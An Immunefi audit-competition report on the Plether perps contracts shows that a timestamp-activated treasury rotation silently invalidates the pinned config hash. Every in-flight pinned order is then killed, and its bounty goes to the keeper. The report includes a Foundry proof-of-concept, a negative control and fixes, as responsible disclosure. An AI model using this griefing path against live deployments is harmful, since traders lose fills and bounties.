# \#97991 [SC-Low] Scheduled treasury rotation silently flips the pinned execution-config hash and terminally kills every in-flight pinned order, moving their reserved execution bounties to the cleanup caller

**Submitted on Nov 4th 2026 at 08:50:33 UTC by @niffylord for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97991
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Summary

A routine, documented owner action — scheduling a successor protocol treasury via `proposeProtocolTreasury` — automatically activates that successor at the current lock's expiry **by bare timestamp, with no transaction and no event**. Because `engine.protocolTreasury()` is a bound component of `OrderLifecycleBook.currentExecutionConfigHash()`, the digest that every fresh order commit is *required* to pin silently flips mid-execution-window at that boundary. Any keeper that then batch-executes terminally settles **every pinned in-flight order — opens and ordinary closes — as `ConfigMismatch`**. Fills never occur; each killed open's reserved execution bounty is transferred from the trader's locked settlement to whoever performs the cleanup; committed margin stays frozen until that permissionless cleanup; a killed ordinary close leaves the trader's position open and unhedged. One routine rotation can destroy every order committed within the preceding execution window (bounded by `maxExecutionWindowSeconds`, code limit **1 hour**, `OrderRouterAdmin.sol:31`).

No principal is stolen — margin returns at cleanup — so the impact anchors on the program's Medium row **"Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)"**: users suffer guaranteed, repeatable damage (lost fills, bounty value moved away from them, frozen margin, unhedged exposure) from an activation they cannot see, cannot cancel, and cannot opt out of.

## Root cause

All references are to the frozen commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`.

**1. The execution-config hash binds the protocol treasury.**
`packages/perps/src/OrderLifecycleBook.sol:199` — inside `currentExecutionConfigHash()`:

```solidity
bytes memory engineConfig = abi.encode(
    engine.planner(),
    engine.settlementSidecar(),
    engine.terminalNavBook(),
    engineAdmin,
    IOrderLifecycleAdminConfigView(engineAdmin).activeConfigVersion(),
    engine.protocolTreasury(),          // <-- line 199: treasury is a bound component
    IOrderLifecyclePoolConfigView(HOUSE_POOL).markStalenessLimit()
);
```

**2. Successor activation is timestamp-only.**
`packages/perps/src/CfdTreasury.sol:70-89` — `proposeProtocolTreasury` (owner-only, documented) schedules activation at the *current* lock's expiry: `uint256 activationTime = _currentTreasury.lockedUntil;` (line 75). `CfdTreasury.sol:100-106` — `_activeTreasury()` then resolves the active treasury purely from time:

```solidity
/// @dev Views resolve activation by timestamp, even before the next treasury mutation persists it.
function _activeTreasury() internal view returns (TreasuryConfig storage active) {
    active = _currentTreasury;
    if (_pendingTreasury.account != address(0) && block.timestamp >= _currentTreasury.lockedUntil) {
        active = _pendingTreasury;      // <-- flips with no transaction and no event
    }
}
```

So at `lockedUntil`, `engine.protocolTreasury()` changes value with no state mutation, no log, and no owner action — while orders committed against the previous digest are still queued.

**3. The flip terminally kills every pinned in-flight order.**
`packages/perps/src/OrderRouterExecutionSidecar.sol:405-414` (single-item path) and `:913-916` inside `_preOracleAction` (batch pre-oracle classification):

```solidity
if (expectedConfigHash != bytes32(0) && book.currentExecutionConfigHash() != expectedConfigHash) {
    return (IOrderRouterExecutionHost.ItemAction.ConfigMismatch, true);   // terminal, pre-oracle
}
...
return _settleNonEngine(configRequest, OrderV3Types.TerminalReason.ConfigMismatch, ...);
```

Config-mismatch is documented terminal with no retry lane (`packages/perps/SECURITY.md:1367-1369`: "known typed planner/policy failures, slippage, expiry, and config mismatch are terminal for the affected order… other orders have no terminal retry lane"), and the settlement deletes the ephemeral order record (`OrderRouter.sol:292-312`) — the kill is permanent, not retryable.

**4. Cleanup economics: margin frozen until cleanup; bounty moves trader → cleanup caller.**
`packages/perps/src/OrderRouter.sol:292-344` — `settleOrderFromSidecar` releases the order reservation and `_settleTerminalBounty` takes the bounty reservation **from the order's own account** and pays it to `bountyRecipient` with `BountyDisposition.Paid`. The disposition rule is enforced in `packages/perps/src/OrderLifecycleBook.sol:717-721`: any terminal reason other than `RiskOff`/`AccountLiquidated` — `ConfigMismatch` included — pays the bounty to `receipt.executor`:

```solidity
} else {
    paid = bounty;
    recipient = receipt.executor;
    disposition = OrderV3Types.BountyDisposition.Paid;
}
```

(Paying the executor on an ordinary failed *open* is the documented disposition, `SECURITY.md:728` — but here the executor collects the bounty for trivial cleanup work while the fill the trader actually wanted never happened.)

**5. Traders cannot opt out.**
- Fresh commits must pin the exact current digest — zero and stale hashes revert (`packages/perps/src/router/OrderLiquidationBatchLogic.sol:294-297`, inside `_validateFreshRequest`):

```solidity
bytes32 currentConfigHash = host.lifecycleBook().currentExecutionConfigHash();
if (bounds.expectedConfigHash == bytes32(0) || bounds.expectedConfigHash != currentConfigHash) {
    revert OrderRouter__ExecutionConfigMismatch(bounds.expectedConfigHash, currentConfigHash);
}
```

  Zero is reserved for Router-authenticated TP/SL trigger closes (`SECURITY.md:760-762`), so only *ordinary user-submitted* orders — opens and closes alike — are exposed.
- Queued orders are user-uncancellable (`SECURITY.md:1345`: "users cannot manually cancel queued intents").
- The activation emits no event, so nothing marks the boundary (`README.md:126`: "No event is emitted merely because time passes: monitors should use the effective getters").

## Preconditions

**Internal (within the system):**
1. Owner starts a treasury lock and schedules a successor — both documented owner actions (`setProtocolTreasury` then `proposeProtocolTreasury`). The program's scope page explicitly places in scope: *"a legitimate, documented action by a trusted role that triggers a bug harming users or the protocol."*
2. The lock expiry passes while orders are in flight (pure time passage — no transaction).
3. Any keeper calls `executeOrderBatch` — keepers are permissionless and explicitly in scope (*"Keepers are not trusted: anyone can execute orders… so harm caused by any caller acting as a keeper is in scope"*).

**External (attacker/environment):** none beyond time passage. No malicious trusted role, no market condition, no oracle behavior, no capital requirement.

**Attack path:** (1) Owner: `setProtocolTreasury(current, D)` + `proposeProtocolTreasury(successor, L)`. (2) Traders commit pinned orders through the real Router V3 path. (3) At `lockedUntil` only time passes; the pinned digest flips silently. (4) Any keeper batch-executes → all pinned in-flight orders classify `ConfigMismatch` pre-oracle and settle terminally. (5) Receipts show `Failed`/`ConfigMismatch`; fills never occur; each killed open's bounty is paid to the cleanup caller; trader margin unlocks only at that cleanup.

## Impact

- **Every pinned in-flight order at the activation boundary is permanently killed** with a `ConfigMismatch` receipt; the fill never occurs. This includes ordinary user-submitted closes — a killed close leaves the position open and exposed to market movement until the trader notices and re-commits (TP/SL trigger closes use the internal zero-hash marker and are unaffected).
- **Each killed open's reserved execution bounty is transferred from the trader's locked settlement to the cleanup caller** — the trader pays a bounty for a fill that never happened.
- **Committed margin + bounty stay frozen** from the silent activation until a permissionless cleanup call.
- **Scale:** execution windows run up to `maxExecutionWindowSeconds` (code limit `MAX_EXECUTION_WINDOW_SECONDS_LIMIT = 1 hours`, `OrderRouterAdmin.sol:31`), so one routine owner rotation destroys up to an hour's worth of committed orders. The behavior recurs on every scheduled rotation.
- **No principal theft** — margin returns at cleanup — which is exactly why this is Griefing rather than theft: damage to users with no profit motive beyond the (documented) cleanup bounty.

## Why this is not a known issue or prior disclosure

- The treasury-scheduling feature itself is **new**: commit `1209ca8a` (PR #130, "feat(perps): lock and schedule treasury rotation", 2026-10-27) postdates every listed audit source (Cecuro AI audit report 2026-10-26, SC Audit Studio pre-audit, AI scan 2026-10-15), so none of them reviewed this code.
- **Cecuro MED-3** is a different root: it concerned `setProtocolTreasury()` reverting while the current treasury held a nonzero clearinghouse balance (dust-blocking rotation), addressed in fix `67f5bad4`. This finding concerns the *scheduled successor's silent timestamp activation* invalidating the order-config digest — different mechanism, different impact.
- **SECURITY.md** discloses the pieces but not the composition. Its hash-binding section (`SECURITY.md:767-777`) states that the hash binds "protocol treasury" and that *"identity and finalized policy drift produces terminal `ConfigMismatch` for config-pinned external orders"* ("This division is intentional"). That section is a specification of pinned-config semantics — it is **not** one of the four SECURITY.md sections the program lists as known-issue-eligible ("Known Limitations", "Router and keeper limitations", "Known limitation: live basket component selection", "Arbitrum and Pyth clock alignment"), and its trigger class does not describe a *routine scheduled rotation activating by bare timestamp with no transaction or event*. The composed consequence — a documented owner action silently mass-killing in-flight orders — is stated nowhere in README (`README.md:116-126` documents timestamp resolution and the missing event as features, and scopes the lock to *"future protocol fee routing, not fund withdrawals"* at line 122), SECURITY.md, the canonical entrypoints, or the PR #130 body (which scopes the change to "Fee amounts, LP economics, and junior-vault maintenance-fee recipients are unchanged." and never mentions the config hash or order execution).
- No entry in the program's known-issues list covers treasury rotation or config-hash order killing.

## Severity justification

Scoring against the program's own impact table, the demonstrated impact hits **Medium: "Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)"** — guaranteed, recurring damage to users (terminally killed orders, bounty value moved away from them, frozen margin, unhedged exposure after killed closes) with no principal theft. (The secondary Medium row "Temporary freezing of funds for at least 1 hour" is cited only as support: the freeze lasts until a permissionless, bounty-incentivized cleanup, so a guaranteed ≥1h freeze is not claimed.) Higher rows do not apply (no theft, no permanent freeze, no insolvency). The code is not yet deployed on mainnet (v2.0.0 on Arbitrum Sepolia per the release record), so per the program's undeployed-code standard the impact is treated as real with any reward scaling element at the minimum.

## Suggested remediation

Any of the following restores the property "a documented treasury rotation must not invalidate orders that pinned the pre-rotation digest":

1. Exclude `engine.protocolTreasury()` from `currentExecutionConfigHash()` (treasury selection does not affect order execution semantics — the settlement/disposition paths read the treasury at settlement time anyway), or
2. Gate activation on an explicit transaction/event (persist the successor in `_syncTreasury()` before the digest flips and emit the activation), plus
3. A grace policy for in-flight orders committed against the immediately-prior digest (e.g. honor the previous digest until each order's own `executionDeadline`).

Regression cases to cover: the same-address lock must keep behaving as a pure commitment (no hash flip during the lock); TP/SL zero-marker closes must remain unpinned; expiry and risk-off terminal paths must be unaffected.

## Proof of Concept

## Setup

- Frozen repository: https://github.com/immunefi-team/audit-comp-plether at `a82d4fefb02768e5b3bddcc97dee371eee24fea8`.
- The PoC is two Foundry test files added under the **out-of-scope** test folder `packages/perps/test/hunt/` (no in-scope contract under `packages/perps/src/` was modified, added, or removed).
- Toolchain: Foundry **1.5.1**, Solidity **0.8.35**, via-IR (the repository's pinned configuration). Runs entirely locally in the repository's own test suite — no mainnet/testnet traffic, per the program's PoC rules.

## How to run

```sh
cd packages/perps
forge test --match-contract CAND_A1_TreasuryFlipKill
```

## Main PoC — `packages/perps/test/hunt/CAND-A1_TreasuryFlipKill.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderLifecycleBook} from "@plether/perps/interfaces/IOrderLifecycleBook.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IMarginClearinghouse} from "@plether/perps/interfaces/IMarginClearinghouse.sol";

/// CAND-A1 - Treasury timestamp-activation vs order config-hash pinning (Q1).
///
/// Root: OrderLifecycleBook.currentExecutionConfigHash() pins engine.protocolTreasury()
/// (OrderLifecycleBook.sol:199), but CfdTreasury resolves the active treasury by bare
/// timestamp with no activation transaction or event (CfdTreasury.sol:100-106). A routine,
/// documented owner action - proposeProtocolTreasury - therefore flips the pinned digest
/// mid-window at the lock expiry, and every in-flight pinned order is terminally settled as
/// ConfigMismatch (OrderRouterExecutionSidecar.sol:406-414) with its reserved execution
/// bounty paid from the trader's locked settlement to whatever caller performs the cleanup
/// (OrderRouter.sol:292-344 + OrderLifecycleBook.sol:717-721 disposition rule).
contract CAND_A1_TreasuryFlipKillTest is BasePerpTest {

    function test_CAND_A1_ScheduledTreasuryActivation_KillsPinnedInFlightOrders() public {
        address successor = address(0x7A11CE);
        address keeper = address(0x5EED);
        address traderA = address(0xA11CE);
        address traderB = address(0xB0B0B);

        // Install a mark so the Router commit path has a reference price.
        vm.prank(address(router));
        engine.updateMarkPrice(1e8, uint64(block.timestamp));

        // (1) Documented owner action: start a short treasury lock and schedule a successor
        //     that activates at that lock's expiry (README treasury section; P7-24).
        address currentTreasury = engine.protocolTreasury();
        engine.setProtocolTreasury(currentTreasury, 10); // same-address lock; hash unchanged
        engine.proposeProtocolTreasury(successor, 0); // activates at lock expiry, no tx needed

        // (2) Two traders commit pinned opens through the real Router V3 path (the harness
        //     scalar enters production commitOrder with expectedConfigHash = currentExecutionConfigHash()).
        _fundTrader(traderA, 5_000e6);
        _fundTrader(traderB, 5_000e6);
        vm.prank(traderA);
        uint64 idA = router.commitOrder(CfdTypes.Side.LONG, 100_000e18, 2_000e6, 1e8, false);
        vm.prank(traderB);
        uint64 idB = router.commitOrder(CfdTypes.Side.SHORT, 100_000e18, 2_000e6, 1e8, false);

        IOrderLifecycleBook book = IOrderLifecycleBook(address(router.lifecycleBook()));
        bytes32 pinnedHash = book.currentExecutionConfigHash();
        OrderV3Types.PendingIntent memory pendingA = book.pendingIntent(idA);
        OrderV3Types.PendingIntent memory pendingB = book.pendingIntent(idB);
        assertEq(pendingA.bounds.expectedConfigHash, pinnedHash, "A pinned to current hash");
        assertEq(pendingB.bounds.expectedConfigHash, pinnedHash, "B pinned to current hash");
        assertEq(pendingA.account, traderA, "A identity");
        assertEq(pendingB.account, traderB, "B identity");
        uint256 bountyA = pendingA.executionBountyAssets;
        uint256 bountyB = pendingB.executionBountyAssets;
        assertGt(bountyA, 0, "open execution bounty reserved");
        assertGt(bountyB, 0, "open execution bounty reserved");

        // Committed margin + bounty are locked inside trader custody.
        IMarginClearinghouse.AccountAssetBuckets memory lockedA = clearinghouse.getAccountAssetBuckets(traderA);
        IMarginClearinghouse.AccountAssetBuckets memory lockedB = clearinghouse.getAccountAssetBuckets(traderB);
        assertEq(lockedA.totalLockedMarginAssets, 2_000e6 + bountyA, "A margin+bounty locked pre-flip");
        assertEq(lockedB.totalLockedMarginAssets, 2_000e6 + bountyB, "B margin+bounty locked pre-flip");

        // (3) Bare-timestamp activation: only time passes - no transaction, no event.
        uint256 expiry = engine.protocolTreasuryLockedUntil();
        vm.warp(expiry + 1);

        assertEq(engine.protocolTreasury(), successor, "successor active by timestamp alone");
        (address stillPending,,) = engine.pendingProtocolTreasury();
        assertEq(stillPending, address(0), "silent activation left no pending record");
        assertTrue(book.currentExecutionConfigHash() != pinnedHash, "pinned digest flipped silently");
        assertEq(uint8(book.lifecycleStatus(idA)), uint8(OrderV3Types.LifecycleStatus.Pending), "A still queued");
        assertEq(uint8(book.lifecycleStatus(idB)), uint8(OrderV3Types.LifecycleStatus.Pending), "B still queued");

        // (4) A permissionless keeper batch-executes: both pinned in-flight orders are
        //     terminally settled as ConfigMismatch before any oracle work.
        _startRecordingLogs();
        vm.prank(keeper);
        OrderV3Types.BatchResult memory batch = router.executeOrderBatch(idB, new bytes[](0));
        assertEq(uint256(batch.terminalCount), 2, "both in-flight pinned orders killed");
        assertEq(uint8(batch.stopReason), uint8(OrderV3Types.PendingReason.None), "batch ran to completion");

        // (5) Impact: fills lost, margin frozen until cleanup, bounty value moved trader -> keeper.
        (uint256 sizeA,,,,,,) = engine.positions(traderA);
        (uint256 sizeB,,,,,,) = engine.positions(traderB);
        assertEq(sizeA, 0, "A fill lost - order never executed");
        assertEq(sizeB, 0, "B fill lost - order never executed");

        OrderV3Types.OrderReceipt memory receiptA = _verifiedReceipt(book, idA);
        OrderV3Types.OrderReceipt memory receiptB = _verifiedReceipt(book, idB);
        assertEq(uint8(receiptA.status), uint8(OrderV3Types.LifecycleStatus.Failed), "A terminal failure");
        assertEq(uint8(receiptA.reason), uint8(OrderV3Types.TerminalReason.ConfigMismatch), "A killed as ConfigMismatch");
        assertEq(uint8(receiptB.status), uint8(OrderV3Types.LifecycleStatus.Failed), "B terminal failure");
        assertEq(uint8(receiptB.reason), uint8(OrderV3Types.TerminalReason.ConfigMismatch), "B killed as ConfigMismatch");
        assertTrue(receiptA.expectedConfigHash != receiptA.observedConfigHash, "A mismatch evidence");
        assertTrue(receiptB.expectedConfigHash != receiptB.observedConfigHash, "B mismatch evidence");

        // The reserved execution bounty of each killed open is paid from the trader's
        // locked settlement to the cleanup caller (disposition Paid to executor).
        assertEq(receiptA.bountyRecipient, keeper, "A bounty routed to cleanup caller");
        assertEq(receiptB.bountyRecipient, keeper, "B bounty routed to cleanup caller");
        assertEq(uint8(receiptA.bountyDisposition), uint8(OrderV3Types.BountyDisposition.Paid), "A bounty paid out");
        assertEq(uint8(receiptB.bountyDisposition), uint8(OrderV3Types.BountyDisposition.Paid), "B bounty paid out");
        assertEq(receiptA.bountyAssets, bountyA, "A full reserved bounty consumed");
        assertEq(receiptB.bountyAssets, bountyB, "B full reserved bounty consumed");

        assertEq(clearinghouse.balanceAssets(keeper), bountyA + bountyB, "keeper collected both bounties");
        assertEq(clearinghouse.balanceAssets(traderA), 5_000e6 - bountyA, "A paid bounty for a fill that never happened");
        assertEq(clearinghouse.balanceAssets(traderB), 5_000e6 - bountyB, "B paid bounty for a fill that never happened");

        // Committed margin is returned to free settlement only at cleanup: it was frozen
        // from the timestamp activation until the keeper's call above.
        IMarginClearinghouse.AccountAssetBuckets memory afterA = clearinghouse.getAccountAssetBuckets(traderA);
        IMarginClearinghouse.AccountAssetBuckets memory afterB = clearinghouse.getAccountAssetBuckets(traderB);
        assertEq(afterA.totalLockedMarginAssets, 0, "A margin unlocked only at cleanup");
        assertEq(afterB.totalLockedMarginAssets, 0, "B margin unlocked only at cleanup");
    }

    /// ASM-070 pin: a public order can never execute unpinned. Fresh requests reject a zero
    /// digest (OrderLiquidationBatchLogic.sol:294-297) and the zero marker is reserved for the
    /// protocol client-id domain (OrderLifecycleBook.sol:263-266).
    function test_CAND_A1_PublicOrderCannotPinZeroConfigHash() public {
        address trader = address(0xA11CE);
        _fundTrader(trader, 5_000e6);
        vm.prank(address(router));
        engine.updateMarkPrice(1e8, uint64(block.timestamp));
        IOrderLifecycleBook book = IOrderLifecycleBook(address(router.lifecycleBook()));

        // (a) Zero expectedConfigHash is rejected on the public commit path.
        OrderV3Types.OrderRequest memory zeroHash = OrderV3Types.OrderRequest({
            clientOrderId: bytes32(uint256(1)),
            side: CfdTypes.Side.LONG,
            sizeDelta: 100_000e18,
            marginDelta: 2_000e6,
            targetPrice: 1e8,
            isClose: false,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(block.timestamp) + 60,
                executionWindowSeconds: 60,
                allowedExecutionModes: 7,
                expectedConfigHash: bytes32(0),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.expectRevert(
            abi.encodeWithSelector(
                IOrderRouterErrors.OrderRouter__ExecutionConfigMismatch.selector,
                bytes32(0),
                book.currentExecutionConfigHash()
            )
        );
        vm.prank(trader);
        router.commitOrder(zeroHash);

        // (b) The zero marker is domain-locked: a protocol-prefixed client id cannot carry a
        //     nonzero pinned hash either, so no public request can claim the unpinned domain.
        zeroHash.clientOrderId = OrderV3Types.protocolClientOrderId(keccak256("attacker-chosen"));
        zeroHash.bounds.expectedConfigHash = book.currentExecutionConfigHash();
        vm.expectRevert(
            abi.encodeWithSelector(
                IOrderLifecycleBook.OrderLifecycleBook__ClientIdDomainMismatch.selector, zeroHash.clientOrderId, false
            )
        );
        vm.prank(trader);
        router.commitOrder(zeroHash);
    }
}
```

## Negative control — `packages/perps/test/hunt/CAND-A1_TreasuryFlipKill_NegControl.t.sol`

Identical sequence with **one change**: no successor is scheduled. This proves the causal variable is the scheduled activation — not the warp itself, mark staleness, deadline expiry, or batch mechanics.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderLifecycleBook} from "@plether/perps/interfaces/IOrderLifecycleBook.sol";

/// CAND-A1 NEGATIVE CONTROL - identical sequence to
/// test_CAND_A1_ScheduledTreasuryActivation_KillsPinnedInFlightOrders with ONE change:
/// `proposeProtocolTreasury(successor, 0)` is NOT called (the same-address 10s lock stays).
///
/// If the finding's causal claim is right: the bare-timestamp warp alone must NOT flip the
/// pinned digest, and the identical keeper batch must NOT kill the orders. If the orders
/// still die here, the main PoC is non-discriminating (warp side-effect, mark staleness,
/// deadline expiry, or batch mechanics would be the real killer).
contract CAND_A1_TreasuryFlipKillNegControlTest is BasePerpTest {

    function test_CAND_A1_NegControl_NoTreasurySchedule_OrdersSurviveSameWarp() public {
        address keeper = address(0x5EED);
        address traderA = address(0xA11CE);
        address traderB = address(0xB0B0B);

        vm.prank(address(router));
        engine.updateMarkPrice(1e8, uint64(block.timestamp));

        // Same-address lock exactly as the main PoC, but NO successor is scheduled.
        address currentTreasury = engine.protocolTreasury();
        engine.setProtocolTreasury(currentTreasury, 10);

        _fundTrader(traderA, 5_000e6);
        _fundTrader(traderB, 5_000e6);
        vm.prank(traderA);
        uint64 idA = router.commitOrder(CfdTypes.Side.LONG, 100_000e18, 2_000e6, 1e8, false);
        vm.prank(traderB);
        uint64 idB = router.commitOrder(CfdTypes.Side.SHORT, 100_000e18, 2_000e6, 1e8, false);

        IOrderLifecycleBook book = IOrderLifecycleBook(address(router.lifecycleBook()));
        bytes32 pinnedHash = book.currentExecutionConfigHash();
        OrderV3Types.PendingIntent memory pendingA = book.pendingIntent(idA);
        assertEq(pendingA.bounds.expectedConfigHash, pinnedHash, "A pinned to current hash");

        // Identical bare-timestamp warp to the same relative horizon as the main PoC.
        uint256 expiry = engine.protocolTreasuryLockedUntil();
        vm.warp(expiry + 1);

        // Core discriminator: without the scheduled activation the digest must NOT flip.
        assertEq(engine.protocolTreasury(), currentTreasury, "treasury unchanged without a successor");
        assertEq(book.currentExecutionConfigHash(), pinnedHash, "warp alone must not flip the digest");

        // Identical keeper batch call; outcome may legitimately be a nonterminal stop
        // (same-block MEV guard) or an oracle-prep revert - neither may kill the orders.
        vm.prank(keeper);
        (bool ok,) = address(router).call(
            abi.encodeWithSignature("executeOrderBatch(uint64,bytes[])", idB, new bytes[](0))
        );
        ok; // batch call success is irrelevant to survival

        // The orders must NOT be terminally killed.
        uint8 statusA = uint8(book.lifecycleStatus(idA));
        uint8 statusB = uint8(book.lifecycleStatus(idB));
        assertTrue(statusA != uint8(OrderV3Types.LifecycleStatus.Failed), "A must not be terminally killed");
        assertTrue(statusB != uint8(OrderV3Types.LifecycleStatus.Failed), "B must not be terminally killed");

        // If ever terminal it must be a normal execution, never ConfigMismatch.
        OrderV3Types.TerminalOutcome memory outA = book.terminalOutcome(idA);
        if (outA.status != OrderV3Types.LifecycleStatus.None) {
            assertTrue(
                uint8(outA.reason) != uint8(OrderV3Types.TerminalReason.ConfigMismatch),
                "A must not die as ConfigMismatch without the flip"
            );
        }
        OrderV3Types.TerminalOutcome memory outB = book.terminalOutcome(idB);
        if (outB.status != OrderV3Types.LifecycleStatus.None) {
            assertTrue(
                uint8(outB.reason) != uint8(OrderV3Types.TerminalReason.ConfigMismatch),
                "B must not die as ConfigMismatch without the flip"
            );
        }

        // Bounty custody must not move to the keeper while the orders are merely live.
        // (A successful fill would legitimately pay the execution bounty - that is not a kill.)
        if (statusA == uint8(OrderV3Types.LifecycleStatus.Pending) && statusB == uint8(OrderV3Types.LifecycleStatus.Pending)) {
            assertEq(clearinghouse.balanceAssets(keeper), 0, "keeper collects nothing without the kill");
        }
    }
}
```

## What each assertion establishes

| Assertion | Impact claim it proves |
|---|---|
| `expectedConfigHash == currentExecutionConfigHash()` at commit; > 0 bounty reserved | Orders are validly pinned through the **real production commit path**; every open reserves a bounty |
| `totalLockedMarginAssets == margin + bounty` pre-flip | Margin + bounty are locked in trader custody while pending |
| `vm.warp(expiry+1)` alone: `protocolTreasury() == successor`, `pendingProtocolTreasury() == 0`, digest `!= pinnedHash`, orders still `Pending` | **Bare-timestamp activation with no transaction and no event** silently flips the digest while orders are in flight |
| `batch.terminalCount == 2`, receipts `Failed`/`ConfigMismatch`, `expectedConfigHash != observedConfigHash`, `positions() == 0` | **Every pinned in-flight order is terminally killed pre-oracle; the fill never occurs** |
| `bountyRecipient == keeper`, `bountyDisposition == Paid`, `bountyAssets == full reserved bounty` | The full reserved bounty is consumed and routed to the cleanup caller |
| `keeper balance == bountyA + bountyB`; trader balances `== 5_000e6 - bounty` | **Value moved trader → cleanup caller for a fill that never happened** |
| `totalLockedMarginAssets == 0` only after the keeper's call | **Margin frozen from silent activation until permissionless cleanup** |
| `test_CAND_A1_PublicOrderCannotPinZeroConfigHash` | No opt-out: zero/stale digests revert on commit, and the unpinned domain is protocol-only |
| Negative control: digest unchanged, orders not killed, keeper collects nothing | Causality: the scheduled activation — not the warp/batch mechanics — is the killer |

## Expected vs actual

- **Expected (correct behavior):** a documented owner rotation must leave orders that pinned the pre-rotation digest executable — or at minimum activate visibly (event/transaction) with a retryable path.
- **Actual:** the digest flips silently at `lockedUntil`; both in-flight pinned orders settle terminally as `Failed`/`ConfigMismatch`; `positions()` remain empty (fills never occur); the keeper collects `bountyA + bountyB` from the traders' locked settlement; margin unlocks only at that cleanup call.

## Full result log

```
$ forge test --match-contract CAND_A1_TreasuryFlipKill

Ran 1 test for test/hunt/CAND-A1_TreasuryFlipKill_NegControl.t.sol:CAND_A1_TreasuryFlipKillNegControlTest
[PASS] test_CAND_A1_NegControl_NoTreasurySchedule_OrdersSurviveSameWarp() (gas: 2811914)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 6.39ms (1.26ms CPU time)

Ran 2 tests for test/hunt/CAND-A1_TreasuryFlipKill.t.sol:CAND_A1_TreasuryFlipKillTest
[PASS] test_CAND_A1_PublicOrderCannotPinZeroConfigHash() (gas: 632137)
[PASS] test_CAND_A1_ScheduledTreasuryActivation_KillsPinnedInFlightOrders() (gas: 4071452)
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 7.23ms (2.65ms CPU time)

Ran 2 test suites in 90.70ms (13.62ms CPU time): 3 tests passed, 0 failed, 0 skipped (3 total tests)
```

## Environment note

The PoC uses the repository's `BasePerpTest` harness with default deployment parameters; no in-scope production contract was modified, no mock replaced any in-scope component, and all testing was local (Foundry test suite at the in-scope commit). USDG and Pyth are exercised through the harness's standard fixtures, consistent with the program's PoC rules.
